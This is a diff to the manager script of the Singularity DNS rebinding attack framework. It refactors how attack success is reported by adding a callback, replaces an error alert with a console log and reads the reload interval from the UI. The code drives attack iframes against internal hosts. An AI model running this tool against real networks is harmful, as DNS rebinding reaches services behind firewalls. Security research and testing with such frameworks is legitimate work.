@@ -33,6 +33,8 @@ const Configuration = () => {
     let interval = null;
     let rebindingStrategy = null;
 
+    let rebindingSuccessFn = null;
+
     // Obtains URL query parameters value based on name
     // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
     //as URLSearchParams API not supported by all browsers
@@ -48,7 +50,7 @@ const Configuration = () => {
     }
 
     return {
-        init() {
+        init(rebindingSuccessCb) {
             // Set URL parameter `startattack` to some value 
             // to automatically start attack upon loading manager.html page
             automatic = getParameterByName("startattack");
@@ -63,6 +65,7 @@ const Configuration = () => {
             // * or to freeze a headless browser forever (unless performing a DoS attack).
             alertSuccess = getParameterByName("alertsuccess");
             type = (window.location.pathname === "/manager.html") ? "manager" : "automatic";
+            rebindingSuccessFn = rebindingSuccessCb;
         },
         getType() {
             return type;
@@ -132,6 +135,9 @@ const Configuration = () => {
         getRebindingStrategy() {
             return rebindingStrategy;
         },
+        getRebindingSuccessFn() {
+            return rebindingSuccessFn
+        },
         setManually(configObject) {
             attackHostIPAddress = configObject.attackHostIPAddress;
             attackHostDomain = configObject.attackHostDomain;
@@ -140,7 +146,8 @@ const Configuration = () => {
             indexToken = configObject.indexToken;
             hideActivity = configObject.hideActivity;
             delayDOMLoad = configObject.delayDOMLoad;
-            
+            rebindingSuccessFn = configObject.rebindingSuccessFn;
+
             if ((type === "automatic") &&
                 (hideActivity === false)) {
                 body.style.display = "block"
@@ -346,7 +353,7 @@ const App = () => {
             }), parseInt(self.getConfiguration().getInterval()) * 1000));
 
         },
-        init() {
+        init(rebindingSuccessCb) {
             let self = this;
 
             fm = FrameManager();
@@ -354,14 +361,14 @@ const App = () => {
             // Configuration
             configuration = Configuration();
             // Initialize defaults settings and settings passed from URL query.
-            configuration.init();
+            configuration.init(rebindingSuccessCb);
 
             // Message handler between Manager and attack frames
             window.addEventListener("message", self.receiveMessage, false);
 
             if (configuration.getType() === "manager") {
 
-                // Sinularity HTTP server settings initialization
+                // Singularity HTTP server settings initialization
                 document.addEventListener("DOMContentLoaded", function (event) {
                     let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
                         document.getElementById("listenports").textContent = HTTPServersConfig.ports;
@@ -425,20 +432,10 @@ const App = () => {
                 }, "*");
             }
             if (msg.data.status == "success") {
-                console.log("Iframe reports attack successful", msg.data.response);
-
+                configuration.getRebindingSuccessFn()(msg);
                 msg.source.postMessage({
                     cmd: "stop"
                 }, "*");
-
-                setTimeout(function () {
-                    delaydomloadframe.src = "about:blank";
-                }, 10000);
-
-                if ((configuration.getAlertSuccess() !== "false") &&
-                    (configuration.getType() === "manager")) {
-                    alert("Attack Successful: " + document.domain + " " + msg.data.response);
-                }
             };
 
             // Possibly a firewalled or closed port. Possibly a non-HTTP service.
@@ -450,8 +447,7 @@ const App = () => {
                     document.getElementById(fid).contentWindow.postMessage({
                         cmd: "stop"
                     }, "*");
-                    //delaydomloadframe.src = "about:blank";
-                    alert("Too many errors");
+                    console.log("Too many errors. Stopping.");
                 }
             }
 
@@ -459,6 +455,9 @@ const App = () => {
         // Starts attack
         begin() {
             let self = this;
+
+            const UiInterval = document.getElementById("interval").value;
+            configuration.setInterval(UiInterval);
 
             let fid = fm.addFrame(hosturl
                 .replace("%1", document.getElementById("attackhostipaddress").value)
@@ -476,13 +475,22 @@ const App = () => {
 
             fm.frame(fid).setTimer(setInterval((() => {
                 self.reloadAttackFrame(fm.frame(fid))
-            }), parseInt(document.getElementById("interval").value) * 1000));
+            }), parseInt(UiInterval) * 1000));
 
             //self.reloadAttackFrame(fm.frame(fid));
         }
     }
 }
 
+function rebindingSuccessCb(msg) {
+    console.log(`Iframe reports attack successful for ${window.location.hostname}\n${msg.data.response}`);
+    if ((app.getConfiguration().getAlertSuccess() !== "false") &&
+        (app.getConfiguration().getType() === "manager")) {
+        alert("Attack Successful: " + document.domain + " " + msg.data.response);
+    }
+
+}
+
 // Start
 const app = App();
-app.init();
+app.init(rebindingSuccessCb);
